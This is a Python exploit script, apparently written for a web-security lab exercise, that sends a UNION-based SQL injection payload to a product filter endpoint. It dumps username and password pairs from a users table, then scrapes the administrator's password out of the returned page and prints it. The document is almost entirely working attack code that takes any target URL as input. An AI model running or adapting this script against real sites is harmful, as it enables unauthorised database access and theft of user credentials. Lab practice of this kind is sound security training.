import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re  

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Pets'
    sql_payload = "' UNION SELECT NULL, username || '*' || password FROM users--"
    r = requests.get(url + path + sql_payload, verify=False) 
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_text = soup.find(text=re.compile('.* administrator .*'))
        if admin_text:
            admin_text = admin_text.split("*")[1]
            print("[+] The administrator password is '%s'." % admin_text)
            return True
        else:
            print("[-] Couldn't extract the administrator password.")
            return False
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Dumping the list of usernames and passwords...\n")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")

